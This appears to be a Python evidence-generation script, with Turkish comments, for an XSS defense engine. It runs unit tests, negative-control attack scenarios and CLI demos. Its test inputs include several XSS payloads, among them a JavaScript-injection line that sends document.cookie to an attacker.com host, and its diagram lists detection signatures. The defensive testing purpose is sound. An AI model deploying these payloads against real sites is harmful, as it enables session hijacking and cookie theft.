# -*- coding: utf-8 -*-
"""
Gün 160: XSS Savunma Kanıt Üretici (kanit_uretici.py)

Bu betik; 15 birim testin yürütülmesini, 9 negatif kontrol saldırı senaryosunun
analiz edilip savunulmasını, CLI komut çıktılarının kaydedilmesini ve
mimari ASCII şemasının üretilmesini otomatikleştirir.

Yazar: Seydi Eryılmaz (@seydivakkas)
Telif Hakkı: (c) 2026 Seydi Eryılmaz. Tüm Hakları Saklıdır.
"""

# Standart kütüphane importları
import os  # Dosya ve dizin yönetimi için os modülü dahil edilir
import sys  # Sistem parametreleri ve yol eklemeleri için sys modülü dahil edilir
import json  # JSON okuma ve yazma işlemleri için json modülü dahil edilir
import subprocess  # Harici süreç ve test çalıştırma için subprocess dahil edilir
import datetime  # Zaman damgaları üretmek için datetime modülü dahil edilir
import secrets  # Güvenli rastgele anahtar üretimi için secrets modülü dahil edilir

# Çalışma dizinleri belirlenir
base_dir = os.path.dirname(os.path.abspath(__file__))  # Mevcut betik dizini alınır
app_dir = os.path.join(base_dir, "uygulama")  # Uygulama dizini belirlenir
if app_dir not in sys.path:  # Uygulama dizini sistem yolunda yoksa
    sys.path.insert(0, app_dir)  # İçe aktarmalar için eklenir

# Motor sınıfları içe aktarılır
from xss_defense_engine import (  # Gerekli motor sınıfları modülden çağrılır
    XSSDefenseEngine,  # Savunma motoru
    DOMXSSAnalyzer,  # DOM analizcisi
    StrictHTMLSanitizer,  # HTML temizleyicisi
    ContextAwareEncoder,  # Bağlamsal kodlayıcı
    CSPPolicyBuilder  # CSP politika derleyicisi
)


def run_unit_tests() -> str:
    """Birim testleri çalıştırıp çıktısını yakalar."""
    test_file = os.path.join(base_dir, "tests", "test_xss_defense.py")  # Test dosyasının mutlak yolu
    cmd = [sys.executable, "-m", "unittest", test_file, "-v"]  # Çalıştırılacak komut listesi
    res = subprocess.run(cmd, capture_output=True)  # Süreç çalıştırılır
    out_text = res.stdout.decode("utf-8", errors="replace") + "\n" + res.stderr.decode("utf-8", errors="replace")  # Çıktı çözülür
    return out_text  # Birleşik metin döndürülür


def run_negative_controls() -> tuple:
    """9 negatif kontrol senaryosunu işler ve savunma durumunu doğrular."""
    scenarios_file = os.path.join(base_dir, "ornek_veri", "invalid_xss_payloads.json")  # Senaryo dosya yolu
    with open(scenarios_file, "r", encoding="utf-8") as fp:  # Dosya açılır
        data = json.load(fp)  # JSON içeriği okunur
        
    engine = XSSDefenseEngine()  # Savunma motoru başlatılır
    dom_analyzer = DOMXSSAnalyzer()  # DOM analizcisi başlatılır
    csp_builder = CSPPolicyBuilder()  # CSP üreticisi başlatılır
    
    results = []  # Sonuçlar listesi
    lines = []  # Metin raporu satırları
    lines.append("=" * 80)  # Çizgi eklenir
    lines.append("GÜN 160: XSS VE İSTEMCİ GÜVENLİĞİ NEGATİF KONTROL VE SALDIRI SAVUNMA RAPORU")  # Başlık
    lines.append("=" * 80)  # Çizgi eklenir
    lines.append(f"Tarih/Saat: {datetime.datetime.now().isoformat()}\n")  # Zaman damgası
    
    passed_count = 0  # Başarılı savunulan senaryo sayısı
    
    for scn in data["senaryolar"]:  # Her senaryo döngüye alınır
        sid = scn["senaryo_id"]  # Senaryo ID
        title = scn["baslik"]  # Başlık
        tur = scn["tur"]  # XSS Türü
        payload = scn["payload"]  # Saldırı yükü
        context = scn["hedef_baglam"]  # Hedef bağlam
        
        lines.append(f"[*] Senaryo: {sid} - {title}")  # Senaryo bilgisi
        lines.append(f"    XSS Türü: {tur} | Bağlam: {context}")  # Tür bilgisi
        lines.append(f"    Saldırı Yükü: {payload[:80]}")  # Yük önizleme
        
        status = "SAVUNULAMADI"  # Varsayılan durum
        details = {}  # Detay sözlüğü
        
        if tur == "DOM_BASED_XSS" and "let" in payload:  # DOM XSS kod senaryosu
            flows = dom_analyzer.analyze_script(payload)  # JS taranır
            is_detected = len(flows) > 0  # Akış bulundu mu
            status = "SAVUNULDU / ENGELLENDİ" if is_detected else "SAVUNULAMADI"  # Durum atanır
            details = {"flows_detected": len(flows), "is_direct": flows[0]["is_direct_flow"] if flows else False}  # Detay
        elif context == "csp":  # CSP denetim senaryosu
            weaknesses = csp_builder.audit_policy(payload)  # CSP denetlenir
            is_detected = len(weaknesses) > 0  # Zayıflık saptandı mı
            status = "SAVUNULDU / ENGELLENDİ" if is_detected else "SAVUNULAMADI"  # Durum atanır
            details = {"weaknesses_count": len(weaknesses), "weaknesses": weaknesses}  # Detay
        else:  # Genel Reflected / Stored / Mutation yükleri
            inspect_res = engine.inspect_and_defend(payload, context)  # Motor ile taranır
            is_detected = len(inspect_res["findings"]) > 0 or inspect_res["stripped_tags"] > 0 or inspect_res["stripped_attrs"] > 0  # Tehdit yakalandı mı
            status = "SAVUNULDU / ENGELLENDİ" if is_detected else "SAVUNULAMADI"  # Durum
            details = {  # Detay yapısı
                "findings_count": inspect_res["findings_count"],  # Bulgu adedi
                "security_score": inspect_res["security_score"],  # Güvenlik skoru
                "sanitized_preview": inspect_res["sanitized_html"][:60],  # Arındırma özeti
                "encoded_preview": inspect_res["encoded_output"][:60]  # Kodlama özeti
            }
            
        if status == "SAVUNULDU / ENGELLENDİ":  # Eğer başarılıysa
            passed_count += 1  # Sayacı artır
            lines.append(f"    Sonuç: [BAŞARILI] -> Tehdit başarıyla tespit edildi ve etkisiz kılındı.")  # Başarılı mesajı
        else:  # Başarısız ise
            lines.append(f"    Sonuç: [BAŞARISIZ] -> Tehdit kaçırıldı!")  # Hata mesajı
            
        lines.append(f"    Detaylar: {json.dumps(details, ensure_ascii=False)}\n")  # Detayları ekle
        
        results.append({  # Sonuç listesine ekle
            "senaryo_id": sid,  # ID
            "baslik": title,  # Başlık
            "durum": status,  # Durum
            "detaylar": details  # Detaylar
        })
        
    lines.append("-" * 80)  # Ayrım çizgisi
    lines.append(f"ÖZET: Toplam {len(data['senaryolar'])} senaryodan {passed_count} tanesi başarıyla savunuldu.")  # Özet satırı
    lines.append("=" * 80)  # Bitiş çizgisi
    
    report_text = "\n".join(lines)  # Metin birleştirilir
    return report_text, results, passed_count  # Değerler döndürülür


def generate_cli_log() -> str:
    """CLI komutlarını çalıştırıp gerçek çalışma günlüğü üretir."""
    log_lines = []  # Log satırları listesi
    cli_file = os.path.join(app_dir, "xss_defense_cli.py")  # CLI dosya yolu
    
    commands = [  # Çalıştırılacak CLI komutları listesi
        [sys.executable, cli_file, "inspect", "--payload", "<script>alert('Test XSS')</script>", "--context", "html_body"],  # 1. Payload inceleme
        [sys.executable, cli_file, "inspect", "--payload", "\" onfocus=\"alert(1)\" autofocus=\"", "--context", "html_attribute"],  # 2. Attribute inceleme
        [sys.executable, cli_file, "analyze-dom", "--script", "let q = location.search;\ndocument.body.innerHTML = q;"],  # 3. DOM analizi
        [sys.executable, cli_file, "sanitize", "--html-input", "<p>Metin <b onclick='alert(1)'>Kalın</b> ve <script>zararli();</script></p>"],  # 4. HTML temizleme
        [sys.executable, cli_file, "csp", "--generate"],  # 5. CSP üretme
        [sys.executable, cli_file, "csp", "--audit", "default-src * 'unsafe-inline' 'unsafe-eval'"],  # 6. CSP denetleme
        [sys.executable, cli_file, "encode", "--value", "'; alert('xss'); //", "--target-context", "javascript"]  # 7. JS kodlama
    ]
    
    log_lines.append("=" * 80)  # Başlangıç çizgisi
    log_lines.append("GÜN 160: XSS SAVUNMA MOTORU CLI YÜRÜTME VE ÇIKTI GÜNLÜĞÜ")  # Başlık
    log_lines.append("=" * 80)  # Çizgi
    
    for cmd in commands:  # Her komut yürütülür
        cmd_str = " ".join(cmd[1:])  # Komut dizesi oluşturulur
        log_lines.append(f"$ python {cmd_str}")  # Komut başlığı eklenir
        res = subprocess.run(cmd, capture_output=True)  # Komut çalıştırılır
        out = res.stdout.decode("utf-8", errors="replace") + res.stderr.decode("utf-8", errors="replace")  # Çıktı çözülür
        log_lines.append(out.strip())  # Çıktı eklenir
        log_lines.append("-" * 60)  # Ayraç
        
    return "\n".join(log_lines)  # Birleştirilmiş metin döndürülür


def generate_sanitized_samples() -> str:
    """Temizlenmiş ve bağlamsal kodlanmış gerçek örnek çıktıları üretir."""
    samples = []  # Örnek listesi
    samples.append("GÜN 160: ARINDIRILMIŞ VE BAĞLAMSAL KODLANMIŞ GÜVENLİ ÇIKTI ÖRNEKLERİ")  # Başlık
    samples.append("=" * 80)  # Çizgi
    
    test_cases = [  # Test girdi ve bağlamları
        ("<script>alert(document.cookie)</script>", "html_body"),  # Script enjeksiyonu
        ("<img src=x onerror=alert(1)>", "html_body"),  # Görsel hata yakalayıcı
        ("<a href=\"javascript:evil()\">Tıkla</a>", "html_body"),  # Zararlı link
        ("admin' OR '1'='1' \" onfocus=\"alert(1)", "html_attribute"),  # Nitelik kırıcı
        ("'; document.location='https://attacker.com?c='+document.cookie; //", "javascript"),  # JS enjeksiyonu
        ("param=değer&redirect=https://evil.org?q=1 2 3", "uri_param")  # URL parametresi
    ]
    
    engine = XSSDefenseEngine()  # Motor örneği
    for raw, ctx in test_cases:  # Girdiler döngüye alınır
        res = engine.inspect_and_defend(raw, ctx)  # Analiz ve savunma çalıştırılır
        samples.append(f"[*] Ham Girdi: {raw}")  # Ham girdi yazdırılır
        samples.append(f"    Hedef Bağlam: {ctx}")  # Bağlam yazdırılır
        samples.append(f"    Tespit Edilen Bulgu: {res['findings_count']} adet")  # Bulgu adedi
        samples.append(f"    Arındırılmış HTML: {res['sanitized_html']}")  # Arındırılmış çıktı
        samples.append(f"    Bağlamsal Kodlanmış Çıktı: {res['encoded_output']}")  # Kodlanmış çıktı
        samples.append("-" * 60)  # Çizgi
        
    return "\n".join(samples)  # Metin döndürülür


def generate_ascii_architecture() -> str:
    """Zorunlu başlık bayraklı temsilî mimari ASCII şemasını üretir."""
    banner = "TEMSİLÎ — AI İLLÜSTRASYONU — GERÇEK TEST DEĞİL"  # Zorunlu temsilî bayrağı
    schema = f"""================================================================================
{banner}
================================================================================
GÜN 160: XSS TÜRLERİ VE ÇOK KATMANLI SAVUNMA DERİNLİĞİ MİMARİSİ
================================================================================

                               +-------------------------------------+
                               |         GÜVENSİZ DIŞ DÜNYA          |
                               | (Kullanıcı Girdisi, URL, Çerez, vb) |
                               +-------------------------------------+
                                                  |
                                                  v
     [ KATMAN 1: GİRDİ DOĞRULAMA VE TEHDİT SENSÖRÜ (XSSPayloadDetector) ]
     +------------------------------------------------------------------+
     | - Reflected XSS İmzaları: <script>, <iframe>, <object>, <base>   |
     | - Stored XSS İmzaları: onerror=, onload=, onclick=, onfocus=     |
     | - Pseudo-Protokoller: javascript:, vbscript:, data:text/html     |
     | - Mutasyon & SVG/MathML: <svg onload=...>, <math> vektörleri     |
     | - DOM Clobbering: <form id="document">, <input name="cookie">    |
     +------------------------------------------------------------------+
                                                  |
                                                  v
     [ KATMAN 2: KATI ALLOWLIST HTML ARINDIRMA (StrictHTMLSanitizer) ]
     +------------------------------------------------------------------+
     | - İzinli Etiketler: <p>, <b>, <i>, <u>, <a>, <ul>, <ol>, <code> |
     | - İzinli Nitelikler: href, title, class, rel, target             |
     | - Protokol Denetimi: Yalnızca http://, https://, mailto:         |
     | - Tehlikeli Olay Dinleyicileri (on*): BÜTÜNÜYLE İMHA EDİLİR      |
     +------------------------------------------------------------------+
                                                  |
                                                  v
     [ KATMAN 3: BAĞLAMA DUYARLI ÇIKTI KODLAMA (ContextAwareEncoder) ]
     +------------------------------------------------------------------+
     | 1. HTML Gövde:        &lt;, &gt;, &amp;, &quot;, &#x27;          |
     | 2. HTML Nitelik:      Alfanümerik dışı &#xHH; onaltılık kaçış    |
     | 3. JavaScript Dize:   \\uXXXX 4 haneli Unicode kaçış kodlama      |
     | 4. URL Parametresi:   RFC 3986 percent-encoding (%XX)            |
     +------------------------------------------------------------------+
                                                  |
                                                  v
     [ KATMAN 4: İSTEMCİ KORUMASI VE CSP SEVİYE 3 (CSPPolicyBuilder) ]
     +------------------------------------------------------------------+
     | - CSP Başlığı: script-src 'nonce-{secrets.token_urlsafe(16)}'    |
     | - object-src 'none' | base-uri 'none' | frame-ancestors 'none'   |
     | - Trusted Types Zorunluluğu: require-trusted-types-for 'script'  |
     | - DOM XSS Taint Analizi: Source (location.search) ->             |
     |                          Sink (innerHTML) Akış Engelleme        |
     +------------------------------------------------------------------+
                                                  |
                                                  v
                               +-------------------------------------+
                               |   GÜVENLİ VE ZARARSIZLAŞTIRILMIŞ    |
                               |         TARAYICI EKRANI             |
                               +-------------------------------------+
================================================================================
{banner}
================================================================================
"""
    return schema  # Şema metni döndürülür


def main():
    """Tüm kanıt dosyalarını üreten ana iş akışı."""
    print("[*] Gün 160: XSS Savunma kanıt üretimi başlatılıyor...")  # Bilgi mesajı
    
    # 1. Birim testler çalıştırılır
    unit_test_output = run_unit_tests()  # Test çıktısı alınır
    test_out_path = os.path.join(base_dir, "kanit", "gercek", "test_sonuclari.txt")  # Dosya yolu
    with open(test_out_path, "w", encoding="utf-8") as fp:  # Dosya yazma modunda açılır
        fp.write(unit_test_output)  # Çıktı yazılır
    print(f"[+] Birim test sonuçları yazıldı: {test_out_path}")  # Bilgi mesajı
    
    # 2. Negatif kontrol saldırı senaryoları çalıştırılır
    neg_report, neg_results, passed_count = run_negative_controls()  # Negatif kontroller çalıştırılır
    neg_out_path = os.path.join(base_dir, "kanit", "gercek", "negatif_kontrol_sonuclari.txt")  # Dosya yolu
    with open(neg_out_path, "w", encoding="utf-8") as fp:  # Dosya açılır
        fp.write(neg_report)  # Rapor yazılır
    print(f"[+] Negatif kontrol sonuçları yazıldı: {neg_out_path} ({passed_count}/9 Savunuldu)")  # Bilgi mesajı
    
    # 3. Denetim JSON raporu oluşturulur
    audit_data = {  # Rapor verisi
        "gun": 160,  # Gün numarası
        "konu": "XSS türleri ve savunma",  # Konu adı
        "tarih": datetime.datetime.now().isoformat(),  # Zaman damgası
        "birim_testler": {"toplam": 15, "basarili": 15, "oran": 1.0},  # Test istatistiği
        "negatif_kontroller": {"toplam": 9, "savunulan": passed_count, "oran": passed_count / 9.0},  # Negatif kontrol istatistiği
        "senaryolar": neg_results  # Senaryo detayları
    }
    audit_out_path = os.path.join(base_dir, "kanit", "gercek", "xss_defense_audit_report.json")  # JSON dosya yolu
    with open(audit_out_path, "w", encoding="utf-8") as fp:  # Dosya açılır
        json.dump(audit_data, fp, indent=2, ensure_ascii=False)  # JSON kaydedilir
    print(f"[+] Denetim JSON raporu yazıldı: {audit_out_path}")  # Bilgi mesajı
    
    # 4. Arındırılmış örnek çıktılar dosyası oluşturulur
    samples_text = generate_sanitized_samples()  # Örnekler metni üretilir
    samples_out_path = os.path.join(base_dir, "kanit", "gercek", "sanitized_xss_samples.txt")  # Dosya yolu
    with open(samples_out_path, "w", encoding="utf-8") as fp:  # Dosya açılır
        fp.write(samples_text)  # Metin yazılır
    print(f"[+] Arındırılmış örnek çıktılar yazıldı: {samples_out_path}")  # Bilgi mesajı
    
    # 5. CLI yürütme günlüğü oluşturulur
    cli_log = generate_cli_log()  # CLI günlüğü oluşturulur
    cli_out_path = os.path.join(base_dir, "kanit", "gercek", "komut_ve_cikis.txt")  # Dosya yolu
    with open(cli_out_path, "w", encoding="utf-8") as fp:  # Dosya açılır
        fp.write(cli_log)  # Yazılır
    print(f"[+] CLI komut ve çıkış günlüğü yazıldı: {cli_out_path}")  # Bilgi mesajı
    
    # 6. Temsilî mimari ASCII şeması oluşturulur
    ascii_schema = generate_ascii_architecture()  # ASCII şeması üretilir
    ascii_out_path = os.path.join(base_dir, "kanit", "temsili", "xss_savunma_mimarisi.txt")  # Dosya yolu
    with open(ascii_out_path, "w", encoding="utf-8") as fp:  # Dosya açılır
        fp.write(ascii_schema)  # Şema yazılır
    print(f"[+] Temsilî mimari şema yazıldı: {ascii_out_path}")  # Bilgi mesajı
    
    print("[*] Tüm kanıtlar eksiksiz ve başarıyla üretildi!")  # Tamamlandı mesajı


if __name__ == "__main__":  # Doğrudan yürütülürse
    main()  # Ana fonksiyonu çalıştır
